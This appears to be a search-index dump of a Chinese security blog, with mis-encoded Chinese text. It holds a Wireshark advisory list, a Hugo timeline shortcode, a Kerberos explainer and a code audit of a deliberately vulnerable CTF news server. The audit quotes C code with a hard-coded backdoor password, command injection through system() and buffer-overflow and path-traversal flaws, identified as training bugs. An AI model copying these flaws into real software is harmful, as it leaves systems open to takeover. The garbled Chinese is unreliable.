[{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/","title":"Windows","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/ntlm/","title":"Ntlm åè®®","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/","title":"åè®®","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/web/","title":"Web","tags":[],"description":"","content":"web Webå®‰å…¨ç ”ç©¶ç›¸å…³\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/","title":"ä»£ç å®¡è®¡","tags":[],"description":"","content":"ä»£ç å®¡è®¡ "},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/kerberos-in-windows/","title":"Windowsä¸­çš„kerberosåè®®","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/","title":"Kerberos åè®®","tags":[],"description":"","content":"kerberosåè®®ç ”ç©¶ "},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/dll-inject/","title":"Dllæ³¨å…¥","tags":[],"description":"","content":"Dllæ³¨å…¥ç ”ç©¶ "},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/transport-layer/socks/","title":"Socksåè®®","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/","title":"éš§é“","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/application-layer/","title":"åº”ç”¨å±‚éš§é“","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/transport-layer/","title":"ä¼ è¾“å±‚éš§é“","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/network-layer/","title":"ç½‘ç»œå±‚éš§é“","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/","title":"å®‰å…¨ç ”ç©¶","tags":[],"description":"","content":"å®‰å…¨ç ”ç©¶ "},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/pe/","title":"Pe","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/","title":"æ¼æ´åˆ†æ","tags":[],"description":"","content":"æ¼æ´åˆ†æ åºå· æ¼æ´å ç¼–å· ç±»å‹ 1 windows æƒé™æå‡æ¼æ´ CVE-2021-40449 æƒé™æå‡ "},{"uri":"https://www.ch35tnut.site/zh-cn/","title":"é¦–é¡µ","tags":[],"description":"","content":"å­¦ä¹ è®°å½• è®°å½•ä¸€äº›å¹³æ—¶å­¦ä¹ å’Œç”Ÿæ´»çš„æ—¥å¸¸ã€‚\n09-13è‡³09-16\r| 234 days ago\rè¿™å‘¨å†å†™ä¸€ä¸ªåŸºäºrustçš„loaderï¼Œå†™äº†ä¸€åŠå‘ç°åŠ è½½çš„dllå¤ªå¤šäº†ï¼Œå†æƒ³åŠæ³•ç”¨åŠ¨æ€åŠ è½½çš„æ–¹å¼åŠ è½½dllï¼Œæ„Ÿè§‰ç”¨ruståšæœ‰ç‚¹éš¾ã€‚\nç”¨rustçš„å†…è”æ±‡ç¼–è·å–åˆ°äº†kernel32.dllå’Œntdll.dllçš„åŸºå€ï¼Œè¿˜è¦ç»§ç»­å®Œå–„ã€‚\n2023\r09-10è‡³09-12\r2 days | 237 days ago\rä¸­ç§‹èŠ‚ï¼Œåœ¨å®¶æ‘¸äº†å‡ å¤©ğŸŸï¼Œå•¥éƒ½æ²¡å¹²\n2023\r09-05è‡³09-09\r4 days | 242 days ago\rè¿™å‘¨ç¼–è¯‘äº†wireshark 1.8.5ï¼Œé€šè¿‡diff1.8.5å’Œ1.8.6çš„æºç æ‰¾å‡º1.8.5é‡Œé¢çš„æ¼æ´ï¼Œè§\rwireshark 1.8.5ä»£ç å®¡è®¡\n2023\r09-03è‡³09-04\r1 day | 244 days ago\rè¿™ä¸¤å¤©ï¼Œç»™hugoä¸»é¢˜å¢åŠ äº†timelineçš„shortcodeï¼Œè§\rå¢åŠ timelineåŠŸèƒ½\n2023\r08-29è‡³09-02\r4 days | 249 days ago\rå‘¨å†…çœ‹äº†ä¸€ä¸ªå‡ ç™¾è¡Œçš„ä»£ç ï¼Œè§\rnews_serverå®¡è®¡\n2023\r"},{"uri":"https://www.ch35tnut.site/zh-cn/dailylife/","title":"ç”Ÿæ´»éšç¬”","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/","title":"æ‚é¡¹","tags":[],"description":"","content":"æ‚é¡¹ æš‚æ— \n"},{"uri":"https://www.ch35tnut.site/zh-cn/others/","title":"å…¶ä»–","tags":[],"description":"","content":"å…¶ä»– "},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/wireshark-185/","title":"Wireshark 1.8.5ä»£ç å®¡è®¡","tags":[],"description":"","content":"é€šè¿‡çˆ¬å–wiresharkçš„æ¼æ´å…¬å‘Šé¡µé¢ï¼Œç­›é€‰1.8.6ä¿®å¤çš„æ¼æ´å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœï¼š\n1.8.6/1.8.7ä¿®å¤çš„æ¼æ´\nwnpa-sec-2013-31. ETCH dissector large loop. Fixed in 1.8.7.\nThe ETCH dissector could go into a large loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-30. MySQL dissector infinite loop. Fixed in 1.8.7.\nThe MySQL dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-29. Websocket dissector crash. Fixed in 1.8.7.\nThe Websocket dissector could crash. Discovered by Moshe Kaplan.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-28. MPEG DSM-CC dissector crash. Fixed in 1.8.7.\nThe MPEG DSM-CC dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-27. DCP ETSI dissector crash. Fixed in 1.8.7.\nThe DCP ETSI dissector could crash. Discovered by Evan Jensen.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-26. PPP CCP dissector crash. Fixed in 1.8.7.\nThe PPP CCP dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-25. ASN.1 BER dissector crash. Fixed in 1.8.7, 1.6.15.\nThe ASN.1 BER dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-24. GTPv2 dissector crash. Fixed in 1.8.7.\nThe GTPv2 dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-23. RELOAD dissector infinite loop. Fixed in 1.8.7.\nThe RELOAD dissector could go into an infinite loop. Discovered by Evan Jensen.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-22. DTLS dissector crash. Fixed in 1.8.6, 1.6.14.\nThe DTLS dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-21. RELOAD dissector infinite loop. Fixed in 1.8.6.\nThe RELOAD dissector could go into an infinite loop. Discovered by Even Jensen.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-20. FCSP dissector infinite loop. Fixed in 1.8.6, 1.6.14.\nThe FCSP dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-19. CIMD dissector crash. Fixed in 1.8.6, 1.6.14.\nThe CIMD dissector could crash. Discovered by Moshe Kaplan.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-18. ACN dissector divide by zero. Fixed in 1.8.6, 1.6.14.\nThe ACN dissector could attempt to divide by zero. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-17. AMPQ dissector infinite loop. Fixed in 1.8.6, 1.6.14.\nThe AMPQ dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-16. Mount dissector crash. Fixed in 1.8.6, 1.6.14.\nThe Mount dissector could crash. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-15. RTPS and RTPS2 dissector crash. Fixed in 1.8.6, 1.6.14.\nThe RTPS and RTPS2 dissectors could crash. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-14. MPLS Echo dissector infinite loop. Fixed in 1.8.6.\nThe MPLS Echo dissector could go into an infinite loop. Discovered by Laurent Butti.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-13. MS-MMS dissector crash. Fixed in 1.8.6, 1.6.14.\nThe MS-MMS dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-12. CSN.1 dissector crash. Fixed in 1.8.6.\nThe CSN.1 dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-11. HART/IP dissector infinite loop. Fixed in 1.8.6.\nThe HART/IP dissectory could go into an infinite loop.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-10. TCP dissector crash. Fixed in 1.8.6.\nThe TCP dissector could crashIt may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nCreated att 2022-09-08T18:13:59+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/news-server/","title":"News Serverå®¡è®¡","tags":[],"description":"","content":"ä»£ç åœ°å€\nhttps://trailofbits.github.io/ctf/vulnerabilities/source_workshop/news_install.sh\nhttps://trailofbits.github.io/ctf/vulnerabilities/source_workshop/news_server.c\nhttps://trailofbits.github.io/ctf/vulnerabilities/source.html\nç¼–è¯‘ï¼šgcc -m32 -g -o news_server news_server.c\nç›®æ ‡ï¼šæ‰¾å‡º10ä¸ªbugå’Œæ¼æ´\nnews_serveré»˜è®¤å·¥ä½œåœ¨æ ¹ç›®å½•ï¼Œæ²¡æœ‰é€šè¿‡chdiråˆ‡æ¢å·¥ä½œç›®å½•ï¼ˆä¸çŸ¥é“ç®—ä¸ç®—bugï¼‰\nä¿®å¤ï¼š\nvoid handleConnection(FILE *logfile, int sock) { chdir(\u0026#34;/root/code/c/news_server/\u0026#34;); åœ¨authenticateå‡½æ•°å­˜åœ¨adminåé—¨\nif (memcmp(pass, \u0026#34;baCkDoOr\u0026#34;, 9) == 0) { return 1; } authenticate ä¸­ç›´æ¥æ‹¼æ¥ç”¨æˆ·è¾“å…¥åˆ°å‘½ä»¤ï¼Œå‘½ä»¤æ³¨å…¥\nint authenticate(FILE *logfile, char *user, char *pass) { char search[512]; char path[1024]; char userfile[1024]; char data[1024]; FILE *file; int ret; memset(path, 0, sizeof(1024)); /* FIXME: hard coded admin backdoor for password recovery */\tif (memcmp(pass, \u0026#34;baCkDoOr\u0026#34;, 9) == 0) { return 1; } /* look up user by checking user files: done via system() to /bin/ls|grep user */ logData(logfile, \u0026#34;performing lookup for user via system()!\\n\u0026#34;); snprintf(userfile, sizeof(userfile)-1, \u0026#34;%s.txt\u0026#34;, user); snprintf(search, sizeof(userfile)-1, \u0026#34;stat %s`ls %s | grep %s`\u0026#34;, USERPATH, USERPATH, userfile); ret = system(search); æ ˆæº¢å‡ºã€ä»»æ„æ–‡ä»¶è¯»ï¼ˆç›®å½•ç©¿è¶Šï¼‰\nvoid readArticle(int sock, FILE *logfile, char *action) { FILE *file; char buf[100]; char path[100]; logData(logfile, \u0026amp;action[1]); strcpy(path, ARTICLEPATH); strcat(path, \u0026amp;action[1]); logData(logfile, \u0026#34;user request to read article: %s\u0026#34;, path); file = fopen(path, \u0026#34;r\u0026#34;); if (!file) { writeSock(sock, FILENOTAVAIL, sizeof(FILENOTAVAIL)); return; } /* fgets for the size of the buffer (100), from the file writing the article to the user each time! */ while (fgets(buf, 1000, file)) æ–‡ä»¶å†™ï¼ˆç›®å½•ç©¿è¶Šï¼‰ã€æ ˆæº¢å‡º11å­—èŠ‚\nvoid writeArticle(int sock, FILE *logfile, char *action) { FILE *file;\tchar *p; size_t x, y; int complete = 0; char buf[1024]; char path[1024]; strcpy(path, ARTICLEPATH); strncat(path, \u0026amp;action[1], sizeof(path)); logData(logfile, \u0026#34;user writing article: %s\u0026#34;, path); file = fopen(\u0026amp;action[1], \u0026#34;w\u0026#34;); if (!file) { writeSock(sock, FILENOTAVAIL, sizeof(FILENOTAVAIL)); return; } writeSock(sock, BEGINFILE, sizeof(BEGINFILE)); "},{"uri":"https://www.ch35tnut.site/zh-cn/others/add-timeline-shortcode/","title":"ç»™hugo-theme-learnå¢åŠ timelineåŠŸèƒ½","tags":[],"description":"","content":"å‰è¨€ ç°åœ¨ä½¿ç”¨hugo-theme-learnä¸»é¢˜ï¼Œä½†è¿™ä¸ªä¸»é¢˜æ²¡æœ‰æä¾›æ—¶é—´çº¿åŠŸèƒ½ï¼Œä¸ºäº†ç»™é¦–é¡µå¢åŠ æ—¶é—´çº¿åŠŸèƒ½ï¼ŒèŠ±äº†ä¸¤å¤©ç ”ç©¶äº†ä¸€ä¸‹æ€ä¹ˆæ·»åŠ æ—¶é—´çº¿åŠŸèƒ½ã€‚\nä¸ºäº†æ–¹ä¾¿å¢åŠ æ—¶é—´çº¿çš„äº‹ä»¶ï¼Œé‡‡ç”¨è‡ªå®šä¹‰shortcodeçš„æ–¹å¼å¢åŠ æ—¶é—´çº¿ï¼Œä»£ç å¤§éƒ¨åˆ†å‚è€ƒå¼•ç”¨é“¾æ¥é‡Œé¢çš„ï¼Œé­”æ”¹äº†ä¸€ä¸‹ä»¥é€‚åº”è‡ªå·±çš„ä¸»é¢˜ï¼Œå¢åŠ äº†è¿‡å»å¤šå°‘å¤©çš„æ˜¾ç¤ºã€‚\nä»£ç å®ç° åœ¨layout/shortcodesæ–°å¢æ–‡ä»¶ï¼ševent.htmlå’Œtimeline.htmlï¼Œå†…å®¹åˆ†åˆ«å¦‚ä¸‹\nevent.html {{$duration := \u0026#34;\u0026#34;}} {{$to := now }} {{ if ne (.Get \u0026#34;to\u0026#34;) \u0026#34;\u0026#34;}} {{$to = time (.Get \u0026#34;to\u0026#34;) }} {{end}} {{$enabledTime := ne (.Get \u0026#34;from\u0026#34;) \u0026#34;\u0026#34;}} {{if $enabledTime }} {{$from := time (.Get \u0026#34;from\u0026#34;) }} {{ $diff := $to.Sub $from }} {{ $days := div $diff.Hours 24 | math.Round }} {{$tmonths:=mul ($to.Sub $from).Hours 0.00136986301 }} {{$months := mod $tmonths 12 }} {{$years := math.Floor (div $tmonths 12)}} {{$yearStr := \u0026#34;years\u0026#34;}} {{if lt $years 2 }} {{$yearStr = \u0026#34;year\u0026#34;}} {{end}} {{$monthStr := \u0026#34;months\u0026#34;}} {{if lt $months 2 }} {{$monthStr = \u0026#34;month\u0026#34;}} {{end}} {{$daysStr := \u0026#34;days\u0026#34;}} {{ $idays :=int $days }} {{$duration = \u0026#34;\u0026#34;}} {{if gt $years 0 }} {{$duration = printf \u0026#34;%s %.0f %s\u0026#34; $duration $years $yearStr}} {{$idays = sub $idays (mul 365 $years)}} {{end}} {{if gt $months 0 }} {{$duration = printf \u0026#34;%s %d %s\u0026#34; $duration $months $monthStr}} {{$idays = sub $idays (mul 30 $months)}} {{end}} {{$idays = int $idays}} {{if gt $idays 0}} {{if lt $idays 2}} {{$daysStr = \u0026#34;day\u0026#34;}} {{end}} {{$duration = printf \u0026#34;%s %d %s\u0026#34; $duration $idays $daysStr}} {{end}} {{end}} {{ $from := .Get \u0026#34;from\u0026#34; | time }} {{ $to := now }} {{ $diff := $to.Sub $from }} {{ $ago := div $diff.Hours 24 | math.Round }} {{ $measure := cond (eq 1 $ago) \u0026#34;day\u0026#34; \u0026#34;days\u0026#34; }} {{ $seed := \u0026#34;foo\u0026#34; }} {{ $random := delimit (shuffle (split (md5 $seed) \u0026#34;\u0026#34; )) \u0026#34;\u0026#34; }} \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;title\u0026#34;\u0026gt;{{.Get \u0026#34;title\u0026#34;}}\u0026lt;/div\u0026gt; {{if $enabledTime }} \u0026lt;div class=\u0026#34;moment\u0026#34; {{ if eq .Ordinal 0 }} id=\u0026#34;moment\u0026#34; {{ end }} {{ if ne .Ordinal 0 }}id=\u0026#34;moment-{{ substr $random 0 16}}\u0026#34;{{end}}\u0026gt; {{ if ne .Ordinal 0 }} {{$duration}} {{ end }} | {{ $ago }} {{ $measure}} ago \u0026lt;/div\u0026gt; {{ end }} \u0026lt;div class=\u0026#34;body\u0026#34;\u0026gt; {{.Inner}} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;date\u0026#34;\u0026gt;{{$to.Year}}\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ if and (eq (.Ordinal) 0) $enabledTime }} \u0026lt;script\u0026gt; function non0plural(number, name) { if (number == 0) { return \u0026#34;\u0026#34; } if (number \u0026gt; 1) { return number + \u0026#34; \u0026#34; + name + \u0026#34;s\u0026#34; } return number + \u0026#34; \u0026#34; + name } function refresh() { start = dayjs({{.Get \u0026#34;from\u0026#34;}}) now = dayjs() total_days = now.diff(start,\u0026#34;d\u0026#34;,true) total_months = now.diff(start, \u0026#34;M\u0026#34;, true) months = total_months % 12 years = Math.floor((total_months) / 12) // for (var i = 0, els = document.querySelectorAll(`[id^=\u0026#34;moment\u0026#34;]`); i \u0026lt; els.length; i++) { // els[i].innerHTML = non0plural(years, \u0026#34;year\u0026#34;) + \u0026#34; \u0026#34; + non0plural(months.toFixed(8), \u0026#34;month\u0026#34;) // } // å¦‚æœæœˆä»½å¤§äº1åˆ™ if(years\u0026gt;=1){ total_days-=365*years } if(months\u0026gt;=1){ total_days-=30*months } el = document.querySelector(\u0026#34;#moment\u0026#34;); el.innerHTML = years\u0026gt;1? non0plural(years, \u0026#34;year\u0026#34;):\u0026#34;\u0026#34; + \u0026#34; \u0026#34; + months\u0026gt;1? non0plural(months.toFixed(4), \u0026#34;month\u0026#34;):\u0026#34;\u0026#34; + total_days\u0026gt;=1?non0plural(total_days.toFixed(2),\u0026#34;day\u0026#34;):\u0026#34;\u0026#34; el.innerHTML = el.innerHTML + \u0026#34; ago\u0026#34; } window.setInterval(refresh, 100); \u0026lt;/script\u0026gt; {{ end }} timeline.html \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; .timeline { position: relative; margin: 0 auto; } /* The actual timeline (the vertical ruler) */ .timeline::after { content: \u0026#34;\u0026#34;; position: absolute; width: 6px; background-color: #444; top: 0; bottom: 0; left: 10%; margin-left: -3px; } /* Container around content */ .timeline .container { padding: 10px 10px 10px 40px; margin-top: 10px; position: relative; /* background-color: gray; */ width: 90%; left: 10%; } /* The circles on the timeline */ .timeline .container::after { content: \u0026#34;\u0026#34;; position: absolute; width: 25px; height: 25px; left: -12px; background-color: rgb(106, 215, 229); border: 4px solid #444; top: 0px; border-radius: 50%; z-index: 1; } /* date display */ .timeline .container .date { position: absolute; top: 0px; z-index: 1; left: -15%; font-size: large; } /* Add arrows to the right container (pointing left) */ .timeline .container::before { content: \u0026#34; \u0026#34;; height: 0; position: absolute; top: 30px; width: 0; z-index: 1; left: 26px; border: medium solid #6ad7e5; border-width: 13px 13px 13px 0px; border-color: #6ad7e5 #6ad7e5 transparent transparent; } /* The actual content */ .timeline .content { box-shadow: 0 0 3px 3px #6ad7e5; background-color: white; position: relative; border-radius: 6px; transition: box-shadow 0.3s; } /* small shadow change on hover*/ .timeline .content:hover { box-shadow: 0 0 3px 4px #6ad7e5; } /* card title format */ .timeline .content .title { padding: 5px 30px; font-weight: bold; display: inline-block; } /* time moment format*/ .timeline .content .moment { color: #c41a16; text-align: right; position: absolute; top: 0; right: 0; padding: 5px; } /* body size */ .timeline .content .body { padding: 5px 30px; word-wrap: break-word; /* height: 73px; */ /* max-height: 120px; */ text-overflow: ellipsis; overflow: hidden; } /* responsive for small devices*/ @media screen and (max-width: 600px) { .timeline .container { padding: 10px 10px 0px 40px; left: 5%; width: 95%; } .timeline .container .date { font-size: small; transform: rotate(-90deg); left: -5%; top: 30px; } .timeline .container::after { left: 3px; } .timeline .content .body { padding: 5px 5px; } .timeline .content .moment { position: relative; } } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026#34;timeline\u0026#34;\u0026gt; {{ .Inner }} \u0026lt;/div\u0026gt; ç”±äºevent.htmlé‡Œé¢å¼•ç”¨äº†dayjsï¼Œè¿™ä¸ªjsä¸åœ¨å½“å‰ä¸»é¢˜å†…ï¼Œå¯ä»¥åœ¨config.tomlæ–°å¢custom_js = [\u0026quot;js/dayjs.min.js\u0026quot;]ï¼Œç„¶åæŠŠdayjs.min.jsæ”¾åœ¨theme\\hugo-theme-learn\\static\\jsç›®å½•å†…ï¼Œå³å¯è§£å†³å¯¼å…¥dayjsçš„é—®é¢˜ã€‚\næ­¤æ—¶å¯ä»¥åœ¨éœ€è¦æ·»åŠ æ—¶é—´çº¿çš„åœ°æ–¹ä½¿ç”¨timelineçš„shortcodeæ·»åŠ ï¼Œä»¥ä¸‹æ˜¯æˆ‘åšå®¢é¦–é¡µçš„æ—¶é—´çº¿ä»£ç ï¼š\n{{\u0026lt; timeline \u0026gt;}} {{% event title=\u0026#34;09-03è‡³09-04\u0026#34; from=\u0026#34;2022-09-03\u0026#34; to=\u0026#34;2022-09-04\u0026#34; %}} è¿™ä¸¤å¤©ï¼Œç»™hugoä¸»é¢˜å¢åŠ äº†timelineçš„shortcodeï¼Œè§[å¢åŠ timelineåŠŸèƒ½](others/add-timeline-shortcode) {{% /event %}} {{% event title=\u0026#34;08-29è‡³09-02\u0026#34; from=\u0026#34;2022-08-29\u0026#34; to=\u0026#34;2022-09-02\u0026#34; %}} å‘¨å†…å®¡è®¡äº†ä»£ç  {{% /event %}} {{\u0026lt; /timeline \u0026gt;}} é™¤äº†è¿™ä¸ªè¿˜é¡ºä¾¿ç»™åšå®¢æ–°å¢äº†åŸºäºGithub issueçš„è¯„è®ºåŠŸèƒ½ï¼Œå‚è€ƒ\rutterancã€‚\nå‚è€ƒ\nhttps://metalblueberry.github.io/post/howto/2021-02-28_hugo_timeline_shortcode/\n"},{"uri":"https://www.ch35tnut.site/zh-cn/about/","title":"å…³äºæˆ‘","tags":[],"description":"","content":"å…³äºæˆ‘ 21å¹´æ¯•ä¸šï¼Œç›®å‰åœ¨æŸå®‰å…¨å‚å•†å·¥ä½œï¼Œä¸»è¦ç ”ç©¶äºŒè¿›åˆ¶ã€‚\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/","title":"è®¤è¯åŸç†","tags":[],"description":"","content":"è®¤è¯åŸç† ä¸€ã€Kerberosæ¦‚å¿µ Kerberosæ˜¯è®¡ç®—æœºç½‘ç»œæˆæƒåè®®ï¼Œç”¨äºåœ¨éå®‰å…¨ç½‘ç»œä¸­ï¼Œå¯¹ä¸ªäººé€šä¿¡è¿‡ç¨‹ä¸­ç”¨å®‰å…¨çš„æ‰‹æ®µè¿›è¡Œèº«ä»½è®¤è¯ã€‚å…¶ä¸­å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯èƒ½å¤Ÿç›¸äº’è®¤è¯ï¼Œè¯†åˆ«å¯¹æ–¹èº«ä»½ã€‚Kerberosæ˜¯ç¬¬ä¸‰æ–¹è®¤è¯ï¼Œä¾èµ–äºç¬¬ä¸‰æ–¹æœåŠ¡å™¨å¯¹å½¼æ­¤è¿›è¡Œèº«ä»½éªŒè¯ï¼ŒKerberosæœåŠ¡å™¨æœ¬èº«æˆä¸ºKDCã€‚ ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š\nKerberosçŸ¥é“ç”¨æˆ·å’Œé›†ç¾¤å†…æœåŠ¡ä»¥åŠå„è‡ªçš„å¯†ç æ•°æ®åº“ ASéªŒè¯ç”¨æˆ·èº«ä»½ï¼ŒéªŒè¯é€šè¿‡å°±ä¼šè¿”å›ç»™Clientç«¯ä¸€ä¸ªTGT Clienté€šè¿‡TGTå‘TGSè·å–ST æœåŠ¡éªŒè¯STæœ‰æ•ˆæ€§ï¼Œå¦‚æœæœ‰æ•ˆåˆ™Clientå¯ä»¥è®¿é—®æœåŠ¡ äºŒã€Kerberosåè¯è§£é‡Š ASï¼ˆAuthentication Serverï¼‰è®¤è¯æœåŠ¡å™¨ KDCï¼ˆKey Distribution Centerï¼‰å¯†é’¥åˆ†å‘ä¸­å¿ƒ TGTï¼ˆTicket Granting Ticketï¼‰ç¥¨æ®æˆæƒç¥¨æ®ï¼Œç»™ç¥¨æ®æˆæƒçš„ç¥¨æ® TGSï¼ˆTicket Granting Serviceï¼‰ç¥¨æ®æˆæƒæœåŠ¡ SSï¼ˆService Serverï¼‰æœåŠ¡æä¾›æœåŠ¡å™¨ STï¼ˆServer Ticketï¼‰æœåŠ¡ç«¯ç¥¨æ® ä¸€èˆ¬KDCåŒæ—¶åŒ…å«ASå’ŒTGS\nä¸‰ã€KerberoséªŒè¯è¿‡ç¨‹ Clientç™»å½•ï¼Œç”¨æˆ·è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œä¼šç”¨å•å‘å‡½æ•°æ ¹æ®å¯†ç ç”Ÿæˆå®¢æˆ·ç«¯å¯†é’¥ï¼ˆClient Secret Keyï¼‰\nClientå‘ASå‘é€Aæ¶ˆæ¯è¯·æ±‚TGT\nAæ¶ˆæ¯å†…å®¹ ç”¨æˆ·å è¯·æ±‚æœåŠ¡åç§°ï¼Œè¿™é‡Œæ˜¯TGS ç½‘ç»œåœ°å€ è¯·æ±‚TGTçš„ç”Ÿå‘½å‘¨æœŸ è¯¥æ¶ˆæ¯ä¸ä¼šåŠ å¯†ï¼Œä¹Ÿä¸ä¼šå‘é€å¯†ç æˆ–è€…å¯†ç ç”Ÿæˆçš„å¯†é’¥ ASæ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ASç”¨æˆ·åæ•°æ®åº“å†…ï¼Œå¹¶ä½¿ç”¨æ•°æ®åº“ä¸­ç”¨æˆ·å¯†ç ç”Ÿæˆçš„NTLMå“ˆå¸Œè§£å¯†å®¢æˆ·ç«¯æ¶ˆæ¯\nå¦‚æœæ•°æ®åº“å†…æœ‰è¯¥ç”¨æˆ·ååˆ™éšæœºç”ŸæˆTGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ï¼ŒåŒæ—¶ç»™Clientç«¯å‘é€ä¸¤æ¡æ¶ˆæ¯\nBæ¶ˆæ¯å†…å®¹ç”¨å®¢æˆ·ç«¯å¯†é’¥åŠ å¯† TGSåç§° æ—¶é—´æˆ³ ç”Ÿå‘½å‘¨æœŸ TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ Cæ¶ˆæ¯å†…å®¹ï¼ˆTGTï¼‰ç”¨TGSå¯†é’¥ï¼ˆTGS Secret Keyï¼‰åŠ å¯† ç”¨æˆ·å TGSåç§° æ—¶é—´æˆ³ ç”¨æˆ·ç½‘ç»œåœ°å€ ç”Ÿå‘½å‘¨æœŸ TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ Clientç”¨é€šè¿‡å¯†ç ç”Ÿæˆçš„å®¢æˆ·ç«¯å¯†é’¥è§£å¯†Bæ¶ˆæ¯ï¼Œå¦‚æœå¯†ç æ­£ç¡®åˆ™å¯ä»¥å¾—åˆ°TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session 